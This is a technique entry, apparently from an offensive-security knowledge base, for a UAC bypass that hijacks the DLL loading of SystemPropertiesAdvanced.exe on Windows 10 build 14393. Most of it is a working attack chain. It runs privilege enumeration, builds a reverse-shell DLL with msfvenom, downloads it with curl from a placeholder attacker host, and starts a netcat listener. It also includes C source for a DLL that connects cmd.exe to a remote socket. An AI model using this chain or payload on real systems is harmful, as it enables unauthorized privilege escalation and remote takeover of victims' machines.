---
description: |
  This technique exploits a DLL hijacking vulnerability in the auto-elevating 32-bit SystemPropertiesAdvanced.exe binary on Windows 10 build 14393. By placing a malicious DLL into a writable folder in the user’s PATH, the attacker can bypass UAC and obtain an elevated shell without triggering a consent prompt.

  Command Reference:
      Target: Windows 10 build 14393

command: |
  # Check current user and integrity level
  whoami /user

code: |
  # Confirm membership in the Administrators group
  net localgroup administrators

  # List user privileges
  whoami /priv

  # Confirm UAC is enabled
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

  # Check UAC prompt behavior for admins
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

  # Determine Windows build version
  powershell -Command "[environment]::OSVersion.Version"

  # Generate malicious reverse-shell DLL on attacker host
  msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f dll > srrstr.dll

  # Host the DLL via HTTP server
  sudo python3 -m http.server 8080

  # Download the malicious DLL to a writable PATH folder on target
  curl http://<attacker_ip>:8080/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

  # Start netcat listener on attacker host
  nc -lvnp <attacker_port>

  # Execute the DLL with rundll32 to test normal shell
  rundll32 shell32.dll,Control_RunDLL C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll

  # Kill existing rundll32 processes before bypass
  taskkill /F /IM rundll32.exe

  # Launch the 32-bit SystemPropertiesAdvanced.exe to trigger DLL hijack
  C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

  // C code for malicious srrstr.dll to spawn reverse shell
  #include <windows.h>
  #include <winsock2.h>
  #pragma comment(lib, "ws2_32.lib")

  void payload() {
      WSADATA wsa;
      SOCKET s;
      struct sockaddr_in server;
      WSAStartup(MAKEWORD(2,2), &wsa);
      s = socket(AF_INET , SOCK_STREAM , 0);
      server.sin_addr.s_addr = inet_addr("<attacker_ip>");
      server.sin_family = AF_INET;
      server.sin_port = htons(<attacker_port>);
      connect(s , (struct sockaddr *)&server , sizeof(server));
      STARTUPINFO si = { sizeof(si) };
      PROCESS_INFORMATION pi;
      si.dwFlags = STARTF_USESTDHANDLES;
      si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
      CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
  }

  BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
      if (fdwReason == DLL_PROCESS_ATTACH) {
          payload();
      }
      return TRUE;
  }

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  - https://attack.mitre.org/techniques/T1548/005/
  - https://github.com/hfiref0x/UACMe#technique-54-systempropertiesadvancedexe-dll-hijacking
  - https://github.com/hfiref0x/UACME
---
